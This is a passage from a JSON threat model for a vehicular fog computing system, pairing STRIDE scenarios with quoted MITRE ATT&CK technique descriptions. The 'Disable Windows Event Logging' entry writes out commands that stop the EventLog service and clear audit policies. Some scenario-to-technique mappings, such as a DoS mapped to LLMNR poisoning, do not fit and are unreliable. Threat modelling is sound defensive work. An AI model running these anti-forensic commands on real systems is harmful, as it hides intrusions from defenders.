                "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. \n\nLegitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)",
                "id": "attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba",
                "technique_id": "T1021"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could intercept and tamper with data flows between fog nodes and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access network data flows.",
                    "Role": "Attacker",
                    "Condition": "Exploiting network vulnerabilities or lack of encryption."
                },
                {
                    "Assumption": "Insufficient encryption of data-in-transit.",
                    "Role": "Network Engineer",
                    "Condition": "Missing or weak encryption practices."
                },
                {
                    "Assumption": "Lack of strong network access controls and monitoring.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate network security policies."
                }
            ],
            "Potential Impact": "Data tampering results in inaccurate analytics and decisions, disrupting service operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "data manipulation",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider could tamper with the cloud service data storage.",
            "Assumptions": [
                {
                    "Assumption": "The insider has access to cloud service infrastructure.",
                    "Role": "Insider",
                    "Condition": "Authorized access to cloud management interfaces or databases."
                },
                {
                    "Assumption": "Lack of audit logging and monitoring for data manipulation activities.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate logging and monitoring mechanisms."
                },
                {
                    "Assumption": "Weak access controls and role-based access enforcement.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient enforcement of access policies."
                }
            ],
            "Potential Impact": "Compromised data integrity and potential loss of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud",
                "insider threat",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending malicious data from a compromised smart vehicle.",
            "Assumptions": [
                {
                    "Assumption": "Lack of effective logging mechanisms in smart vehicles.",
                    "Role": "System Developer",
                    "Condition": "Logging mechanisms are absent or inadequate."
                },
                {
                    "Assumption": "No digital signatures or similar techniques are used for data logs.",
                    "Role": "System Architect",
                    "Condition": "Absence of integrity checks for logs and data."
                },
                {
                    "Assumption": "There is no centralized log management for correlation and analysis.",
                    "Role": "System Administrator",
                    "Condition": "Logging data is not centralized."
                }
            ],
            "Potential Impact": "Difficulty in traceability and accountability, hindered forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "integrity",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies tampering with the fog node settings.",
            "Assumptions": [
                {
                    "Assumption": "Logs do not capture administrative activities adequately.",
                    "Role": "System Administrator",
                    "Condition": "Logs capture insufficient details."
                },
                {
                    "Assumption": "Lack of user action validation and digital signatures in fog nodes.",
                    "Role": "System Developer",
                    "Condition": "No validation mechanisms for configuration changes."
                },
                {
                    "Assumption": "Insufficient role-based access controls (RBAC) on operational activities.",
                    "Role": "System Architect",
                    "Condition": "Weak enforcement of RBAC policies."
                }
            ],
            "Potential Impact": "Accountability issues and potential unauthorized configuration changes in fog nodes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "integrity",
                "access control"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies unauthorized access to the cloud service analytics.",
            "Assumptions": [
                {
                    "Assumption": "No immutable audit trail for access logs in cloud services.",
                    "Role": "Security Analyst",
                    "Condition": "Audit logs are mutable or tampered."
                },
                {
                    "Assumption": "No integration of forensic readiness in cloud services.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Inadequate forensic preparedness and logging mechanisms."
                },
                {
                    "Assumption": "Weak identity management and access control mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Identity and access controls are not strong or well-enforced."
                }
            ],
            "Potential Impact": "Lack of evidence for forensic investigation, accountability issues in cloud service usage.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "cloud",
                "access control"
            ],
            "mitre_technique": {
                "name": "Revert Cloud Instance",
                "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
                "id": "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1",
                "technique_id": "T1578.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive driving patterns and location data intercepted from smart vehicle data flows.",
            "Assumptions": [
                {
                    "Assumption": "No encryption of data-in-transit between smart vehicles and fog nodes.",
                    "Role": "Network Engineer",
                    "Condition": "Data is transmitted unencrypted over communication channels."
                },
                {
                    "Assumption": "Insufficient network security monitoring to detect eavesdropping.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate network intrusion detection and monitoring."
                },
                {
                    "Assumption": "Vehicles do not use onboard encryption mechanisms effectively.",
                    "Role": "System Developer",
                    "Condition": "Limited or absent encryption at device level."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive location and behavioral patterns of users.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "data interception",
                "eavesdropping"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Fog node misconfiguration leads to unintended data exposure.",
            "Assumptions": [
                {
                    "Assumption": "Configuration tools and procedures lack security checks.",
                    "Role": "System Administrator",
                    "Condition": "Absence of configuration validation and security check procedures."
                },
                {
                    "Assumption": "No access control or permissions checks on the exposed data.",
                    "Role": "Security Analyst",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "Regular security audits are not performed.",
                    "Role": "Compliance Officer",
                    "Condition": "Lack of regular security audits and assessments."
                }
            ],
            "Potential Impact": "Sensitive information inadvertently exposed to unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "configuration management",
                "access control",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Insiders accessing sensitive data from cloud service databases.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication and authorization protocols in cloud services.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Access control is not robust or enforced strictly."
                },
                {
                    "Assumption": "Insider access is not monitored or logged effectively.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate monitoring and logging for insider actions."
                },
                {
                    "Assumption": "No data encryption at rest in cloud databases.",
                    "Role": "Database Administrator",
                    "Condition": "Data is stored without encryption."
                }
            ],
            "Potential Impact": "Unauthorized access and potential leakage of sensitive data stored in cloud databases.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud",
                "insider threat",
                "database"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Overloading fog nodes with excessive data traffic, leading to service disruption.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting or throttling mechanisms in fog nodes.",
                    "Role": "System Architect",
                    "Condition": "Lack of protections against excessive traffic."
                },
                {
                    "Assumption": "Network lacks monitoring to detect and mitigate DoS attacks early.",
                    "Role": "Network Engineer",
                    "Condition": "Inadequate network monitoring and intrusion detection."
                },
                {
                    "Assumption": "Fog nodes do not have efficient resource management.",
                    "Role": "System Developer",
                    "Condition": "Resource management mechanisms are weak or absent."
                }
            ],
            "Potential Impact": "Service disruption due to fog nodes being unable to process legitimate data.",
            "MITRE ATT&CK Keywords": [
                "dos",
                "network",
                "resource exhaustion",
                "overload"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DoS attack on the cloud service, affecting backend data processing.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service lacks DDoS protection.",
                    "Role": "Cloud Service Provider",
                    "Condition": "DDoS mitigation services are not employed."
                },
                {
                    "Assumption": "Scalability mechanisms are inadequately configured.",
                    "Role": "System Architect",
                    "Condition": "System is not capable of handling burst traffic."
                },
                {
                    "Assumption": "Insufficient monitoring and response mechanisms.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate cloud service monitoring and incident response."
                }
            ],
            "Potential Impact": "Backend processing and analytics are disrupted, affecting overall service resilience.",
            "MITRE ATT&CK Keywords": [
                "dos",
                "cloud",
                "resource exhaustion",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Targeting of RSUs with excessive bogus data, leading to local traffic management failure.",
            "Assumptions": [
                {
                    "Assumption": "RSUs lack protections against high data input.",
                    "Role": "Hardware Engineer",
                    "Condition": "No safeguards to handle input overload."
                },
                {
                    "Assumption": "Weak monitoring of data input in RSUs.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate detection and monitoring for abnormal inputs."
                },
                {
                    "Assumption": "Rate limiting or data validation checks are not effectively implemented.",
                    "Role": "System Developer",
                    "Condition": "Absence of data validation and rate limiting mechanisms."
                }
            ],
            "Potential Impact": "Local traffic management disruptions leading to potential vehicular chaos.",
            "MITRE ATT&CK Keywords": [
                "dos",
                "local",
                "resource exhaustion",
                "traffic management"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A local attacker exploits software flaws in fog nodes to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Vulnerabilities are known but unpatched."
                },
                {
                    "Assumption": "No role-based access control (RBAC) on administrative functions.",
                    "Role": "System Developer",
                    "Condition": "RBAC is inadequately implemented."
                },
                {
                    "Assumption": "Lack of strict verification for privileged access actions.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of detailed access verification mechanisms."
                }
            ],
            "Potential Impact": "Attacker gains unauthorized control over fog nodes, impacting all downstream services.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "exploitation",
                "fog nodes",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Remote attacker exploits cloud service API to gain elevated privileges in the cloud environment.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services use APIs with known vulnerabilities.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Publicly known but unpatched API vulnerabilities."
                },
                {
                    "Assumption": "API calls are not thoroughly authenticated and authorized.",
                    "Role": "System Architect",
                    "Condition": "APIs lack adequate authentication and authorization checks."
                },
                {
                    "Assumption": "Debugging features or backdoors are accessible via the API.",
                    "Role": "System Developer",
                    "Condition": "APIs expose unsafe or debug functionalities."
                }
            ],
            "Potential Impact": "Elevated access leads to unauthorized actions in cloud services, impacting data integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud",
                "api exploitation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Insider leverages weak access controls to escalate privileges in the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Weak or improperly configured access policies.",
                    "Role": "System Administrator",
                    "Condition": "Configuration errors or overly permissive settings."
                },
                {
                    "Assumption": "Lack of monitoring and detection for privileged access escalation.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate monitoring mechanisms."
                },
                {
                    "Assumption": "Absence of regular audits on access control configurations.",
                    "Role": "Compliance Officer",
                    "Condition": "No periodic reviews of access controls."
                }
            ],
            "Potential Impact": "Unauthorized privileges affecting sensitive data and system operations, leading to potential data breaches and system misuse.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "access control",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
